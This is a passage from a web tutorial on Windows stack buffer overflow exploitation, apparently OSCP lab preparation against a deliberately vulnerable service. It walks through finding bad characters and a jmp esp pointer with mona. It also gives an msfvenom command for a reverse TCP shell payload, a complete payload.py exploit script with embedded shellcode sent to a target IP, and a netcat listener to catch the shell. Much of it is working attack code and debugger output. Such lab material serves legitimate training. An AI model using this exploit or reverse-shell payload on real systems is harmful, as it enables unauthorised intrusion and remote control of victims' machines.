234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;Could not connect.&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><br></span></code></pre></div></div>
<p>When you send this payload <code>./badchar.py</code> and crash the app, use mona again to run a &quot;compare&quot; between the <code>bytearray.bin</code> you generated at the beginning with <code>!mona bytearray -b &quot;\x00&quot;</code> and the array that&#x27;s now in memory starting where the ESP is pointing.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="mona-compare">!mona compare<a href="#mona-compare" class="hash-link" aria-label="Direct link to !mona compare" title="Direct link to !mona compare">‚Äã</a></h3>
<p>The steps are as follows:</p>
<ol>
<li>Send the payload with the bytearray you generated and crash the app</li>
<li>Read the value of the <code>ESP</code> register e.g. <code>01ACFA30</code></li>
<li>Run the <code>!mona compare</code> command using: <code>!mona compare -f C:\Users\admin\Desktop\vulnerable-apps\oscp\bytearray.bin -a 01ACFA30</code></li>
<li>mona will give you a list of characters it believes are &quot;bad&quot;, and look something like this: <code>00 a0 a1 ad ae be bf de df ef f0</code></li>
</ol>
<p>You now have your bad characters list.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="verify">verify<a href="#verify" class="hash-link" aria-label="Direct link to verify" title="Direct link to verify">‚Äã</a></h3>
<p>Not all characters in mona&#x27;s bad character list are legitimate bad chars.</p>
<blockquote>
<p>How do we verify?</p>
</blockquote>
<div class="theme-admonition theme-admonition-tip admonition_xJq3 alert alert--success"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 12 16"><path fill-rule="evenodd" d="M6.5 0C3.48 0 1 2.19 1 5c0 .92.55 2.25 1 3 1.34 2.25 1.78 2.78 2 4v1h5v-1c.22-1.22.66-1.75 2-4 .45-.75 1-2.08 1-3 0-2.81-2.48-5-5.5-5zm3.64 7.48c-.25.44-.47.8-.67 1.11-.86 1.41-1.25 2.06-1.45 3.23-.02.05-.02.11-.02.17H5c0-.06 0-.13-.02-.17-.2-1.17-.59-1.83-1.45-3.23-.2-.31-.42-.67-.67-1.11C2.44 6.78 2 5.65 2 5c0-2.2 2.02-4 4.5-4 1.22 0 2.36.42 3.22 1.19C10.55 2.94 11 3.94 11 5c0 .66-.44 1.78-.86 2.48zM4 14h5c-.23 1.14-1.3 2-2.5 2s-2.27-.86-2.5-2z"></path></svg></span>Rule of Thumb</div><div class="admonitionContent_BuS1"><p>The &quot;next byte&quot; after a badchar can get corrupted, so the real badchar will only be the FIRST in any consecutive characters e.g. if mona says <code>1 2 3 4 5 6</code> are bad chars, really the real badchars are <code>1 3 5</code> because <code>2 4 6</code> would be fine and just got corrupted by the <em>real</em> bad characters that came before it.</p></div></div>
<p>For example, say after a compare mona gives us this list of bad chars: <code>00 a0 a1 ad ae be bf de df ef f0</code>.</p>
<p>We apply our rule of thumb, and guess that only the following from the sequence are the <em>real</em> bad characters: <code>a0 ad be de ef</code></p>
<p>We test this by generating another byte array using mona, but adding the other bytes we want to exclude from our <em>real</em> bad character list:</p>
<p><code>!mona bytearray -b &quot;\x00\xa0\xad\xbe\xde\xef&quot;</code></p>
<p>And go through the same steps 1 to 4 above.</p>
<p>If our guess is correct, we will get an &quot;<code>Unmodified</code>&quot; status which means our byte array payload has no bad characters in it.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="find-a-jmp-point">Find a jmp point<a href="#find-a-jmp-point" class="hash-link" aria-label="Direct link to Find a jmp point" title="Direct link to Find a jmp point">‚Äã</a></h2>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p><em>Read: <a href="https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/" target="_blank" rel="noopener noreferrer">mona manual</a></em></p></div></div>
<p>We have control of the EIP so we can write an address over it to &quot;jump somewhere and execute&quot; code, so we need to find this return address of a pointer that will allow us to use it to &quot;jump&quot; where we want to go.</p>
<p>I use the word &quot;allow&quot; because the return address of the module we&#x27;re trying to jump from has to have any protections disabled or missing.</p>
<p>The command we can use to find all available &quot;pointers&quot;, for example:</p>
<p><code>!mona jmp -r esp -cpb &quot;\x00\xa0\xad\xbe\xde\xef&quot;</code></p>
<p>this command tells <code>mona</code> to:</p>
<ul>
<li>look for <code>jmp</code> instructions pointers</li>
<li>given the register <code>esp</code></li>
<li><code>-cpb</code> and skip any pointers that have any of these bad characters <code>&quot;\x00\xa0\xad\xbe\xde\xef&quot;</code></li>
</ul>
<p>Run the command in Immunity Debugger and you see something like this (&quot;Log Data&quot; window):</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token plain">           ---------- Mona command started on 2022-01-13 04:36:15 (v2.0, rev 605) ----------</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0BADF00D   [+] Processing arguments and criteria</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0BADF00D       - Pointer access level : X</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0BADF00D       - Bad char filter will be applied to pointers : &quot;\x00\xa0\xad\xbe\xde\xef&quot;</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0BADF00D   [+] Generating module info table, hang on...</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0BADF00D       - Processing modules</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0BADF00D       - Done. Let&#x27;s rock &#x27;n roll.</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0BADF00D   [+] Querying 2 modules</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0BADF00D       - Querying module essfunc.dll</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">74840000   Modules C:\Windows\System32\wshtcpip.dll</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0BADF00D       - Querying module oscp.exe</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0BADF00D       - Search complete, processing results</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0BADF00D   [+] Preparing output file &#x27;jmp.txt&#x27;</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0BADF00D       - (Re)setting logfile C:\Users\admin\Desktop\vulnerable-apps\oscp\jmp.txt</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0BADF00D   [+] Writing results to C:\Users\admin\Desktop\vulnerable-apps\oscp\jmp.txt</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0BADF00D       - Number of pointers of type &#x27;jmp esp&#x27; : 9</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0BADF00D   [+] Results :</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">625011AF     0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">625011BB     0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">625011C7     0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">625011D3     0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">625011DF     0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">625011EB     0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">625011F7     0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">62501203     0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">62501205     0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0BADF00D       Found a total of 9 pointers</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0BADF00D</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">0BADF00D   [+] This mona.py action took 0:00:00.702000</span><br></span></code></pre></div></div>
<p>mona found <code>9 pointers</code> that fit our criteria.</p>
<p>Pick a jmp point = <code>625011F7</code> and convert to little endian format: <code>\xf7\x11\x50\x62</code></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="shellcode">Shellcode<a href="#shellcode" class="hash-link" aria-label="Direct link to Shellcode" title="Direct link to Shellcode">‚Äã</a></h2>
<p>Now that we have our return address for our pointer jmp point, we can put the final piece of the payload together- the shellcode.</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="msfvenom">msfvenom<a href="#msfvenom" class="hash-link" aria-label="Direct link to msfvenom" title="Direct link to msfvenom">‚Äã</a></h3>
<p>Use <code>msfvenom</code> to generate a reverse tcp shell to pop a connection back to your listener:</p>
<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.11.55.83 LPORT=4444 EXITFUNC=thread -b &quot;\x00\xa0\xad\xbe\xde\xef&quot; -f c</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="payloadpy">payload.py<a href="#payloadpy" class="hash-link" aria-label="Direct link to payload.py" title="Direct link to payload.py">‚Äã</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#d6deeb;--prism-background-color:#011627"><div class="codeBlockTitle_OeMC">payload.py</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#d6deeb;background-color:#011627"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#d6deeb"><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">#!/usr/bin/env python3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">import</span><span class="token plain"> socket</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">ip </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;172.16.2.125&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">port </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">9999</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">offset </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">6108</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">overflow </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">*</span><span class="token plain"> offset</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">retn </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\xf7\x11\x50\x62&quot;</span><span class="token plain"> </span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># found using mona</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">padding </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x90&quot;</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">*</span><span class="token plain"> </span><span class="token number" style="color:rgb(247, 140, 108)">16</span><span class="token plain"> </span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic"># NOP sled</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">shellcode </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\xa4\xa6\x8c\x59\x83\xee\xfc\xe2\xf4\x58\x4e\x0e\x59\xa4\xa6&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\xec\xd0\x41\x97\x4c\x3d\x2f\xf6\xbc\xd2\xf6\xaa\x07\x0b\xb0&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x2d\xfe\x71\xab\x11\xc6\x7f\x95\x59\x20\x65\xc5\xda\x8e\x75&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x84\x67\x43\x54\xa5\x61\x6e\xab\xf6\xf1\x07\x0b\xb4\x2d\xc6&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x65\x2f\xea\x9d\x21\x47\xee\x8d\x88\xf5\x2d\xd5\x79\xa5\x75&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x07\x10\xbc\x45\xb6\x10\x2f\x92\x07\x58\x72\x97\x73\xf5\x65&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x69\x81\x58\x63\x9e\x6c\x2c\x52\xa5\xf1\xa1\x9f\xdb\xa8\x2c&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x40\xfe\x07\x01\x80\xa7\x5f\x3f\x2f\xaa\xc7\xd2\xfc\xba\x8d&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x8a\x2f\xa2\x07\x58\x74\x2f\xc8\x7d\x80\xfd\xd7\x38\xfd\xfc&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\xdd\xa6\x44\xf9\xd3\x03\x2f\xb4\x67\xd4\xf9\xce\xbf\x6b\xa4&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\xa6\xe4\x2e\xd7\x94\xd3\x0d\xcc\xea\xfb\x7f\xa3\x59\x59\xe1&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x34\xa7\x8c\x59\x8d\x62\xd8\x09\xcc\x8f\x0c\x32\xa4\x59\x59&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x09\xf4\xf6\xdc\x19\xf4\xe6\xdc\x31\x4e\xa9\x53\xb9\x5b\x73&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x1b\x33\xa1\xce\x86\x52\x93\xf5\xe4\x5b\xa4\xb7\xd0\xd0\x42&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\xcc\x9c\x0f\xf3\xce\x15\xfc\xd0\xc7\x73\x8c\x21\x66\xf8\x55&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x5b\xe8\x84\x2c\x48\xce\x7c\xec\x06\xf0\x73\x8c\xcc\xc5\xe1&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x3d\xa4\x2f\x6f\x0e\xf3\xf1\xbd\xaf\xce\xb4\xd5\x0f\x46\x5b&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\xea\x9e\xe0\x82\xb0\x58\xa5\x2b\xc8\x7d\xb4\x60\x8c\x1d\xf0&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\xf6\xda\x0f\xf2\xe0\xda\x17\xf2\xf0\xdf\x0f\xcc\xdf\x40\x66&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x22\x59\x59\xd0\x44\xe8\xda\x1f\x5b\x96\xe4\x51\x23\xbb\xec&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\xa6\x71\x1d\x6c\x44\x8e\xac\xe4\xff\x31\x1b\x11\xa6\x71\x9a&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\x8a\x25\xae\x26\x77\xb9\xd1\xa3\x37\x1e\xb7\xd4\xe3\x33\xa4&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\xf5\x73\x8c&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">postfix </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token builtin" style="color:rgb(130, 170, 255)">buffer</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> overflow </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> retn </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> padding </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> shellcode </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> postfix</span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">s </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">AF_INET</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> socket</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">SOCK_STREAM</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">try</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  s</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">connect</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token plain">ip</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> port</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  </span><span class="token keyword" style="color:rgb(127, 219, 202)">print</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;Sending evil buffer...&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  s</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token builtin" style="color:rgb(130, 170, 255)">bytes</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token builtin" style="color:rgb(130, 170, 255)">buffer</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;\r\n&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&quot;latin-1&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  </span><span class="token keyword" style="color:rgb(127, 219, 202)">print</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;Done!&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token keyword" style="color:rgb(127, 219, 202)">except</span><span class="token punctuation" style="color:rgb(199, 146, 234)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#d6deeb"><span class="token plain">  </span><span class="token keyword" style="color:rgb(127, 219, 202)">print</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&quot;Could not connect.&quot;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><br></span></code></pre></div></div>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>NOP Sled</div><div class="admonitionContent_BuS1"><blockquote>
<p>What is a NOP Sled and what does it do?</p>
</blockquote><p>Brilliant <a href="https://stackoverflow.com/questions/14760587/how-does-a-nop-sled-work" target="_blank" rel="noopener noreferrer">stackoverflow</a> answer:</p><p>&quot;Some attacks consist of making the program jump to a specific address and continue running from there. The injected code has to be loaded previously somehow in that exact location.</p><p>Stack randomization and other runtime differences may make the address where the program will jump impossible to predict, so the attacker places a NOP sled in a big range of memory. If the program jumps to anywhere into the sled, it will run all the remaining NOPs, doing nothing, and then will run the payload code, just next to the sled.</p><p>The reason the attacker uses the NOP sled is to make the target address bigger: the code can jump anywhere in the sled, instead of exactly at the beginning of the injected code.&quot;</p></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="listener--pop">listener + pop<a href="#listener--pop" class="hash-link" aria-label="Direct link to listener + pop" title="Direct link to listener + pop">‚Äã</a></h3>
<p>On your attack machine, run a listener: <code>rlwrap nc -lvnp 4444</code></p>
<p>Run <code>./payload.py</code> and if everything went correctly, you will have a shell pop in your listener.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="references">References<a href="#references" class="hash-link" aria-label="Direct link to References" title="Direct link to References">‚Äã</a></h2>
<ul>
<li><a href="https://www.notsoshant.io/blog/windows-exploitation-dealing-with-bad-characters-quickzip-exploit/" target="_blank" rel="noopener noreferrer">Windows Exploitation: Dealing with bad characters‚Ää‚Äî‚ÄäQuickZip exploit</a></li>
<li><a href="https://www.youtube.com/watch?v=ncBblM920jw" target="_blank" rel="noopener noreferrer">Buffer Overflows Made Easy (2022 Edition)</a></li>
</ul></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-tags-row"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/docs/tags/buffer-overflow">buffer-overflow</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/docs/tags/exploitation">exploitation</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/docs/tags/windows">windows</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/docs/tags/pentest">pentest</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/docs/tags/exploit-dev">exploit-dev</a></li></ul></div></div><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/ronamosa/ronamosa.github.io/edit/main/website/docs/hacker/bufferoverflow/1.windows.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"><span class="theme-last-updated">Last updated<!-- --> on <b><time datetime="2026-02-20T20:05:57.000Z" itemprop="dateModified">Feb 20, 2026</time></b> by <b>Ron Amosa</b></span></div></div></footer><div class="newsletterCta_rTTm"><p><span class="emoji_bVKv">üì¨</span> I also write a fortnightly newsletter ‚Äî my thoughts on the machines that educate, empower, and exploit our society.<!-- --> <a href="/subscribe">Subscribe here.</a></p></div></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/hacker/HowToDecodeStuff"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Cryptography and Decoding Techniques for CTF and Penetration Testing</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/hacker/bufferoverflow/x86"><div class="pagination-nav__sublabel">Next</div><div 